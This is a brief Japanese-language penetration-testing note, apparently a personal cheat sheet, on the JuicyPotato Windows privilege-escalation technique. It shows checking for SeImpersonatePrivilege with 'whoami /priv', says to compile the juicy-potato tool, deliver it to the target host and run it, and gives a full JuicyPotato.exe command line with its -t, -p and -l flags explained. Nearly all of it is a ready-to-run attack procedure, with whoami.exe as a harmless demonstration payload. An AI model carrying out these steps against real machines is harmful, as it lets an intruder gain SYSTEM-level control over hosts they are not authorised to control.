# JuicyPotate

```
whoami /priv
```

`SeImpersonatePrivilege`権限があることを確認

https://github.com/ohpe/juicy-potato

juicy-potatoをvisual studioでコンパイルして、攻撃対象ホストに配送し、コマンドを実行する。

```
C:\Users\Public\UsersPublicJuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837
```

* -t：CreateProcessWithTokenの使用を指示する
* -pフラグで実行しようとするプログラムを指定
* -lフラグでCOMサーバーがリッスンするポートを任意に指定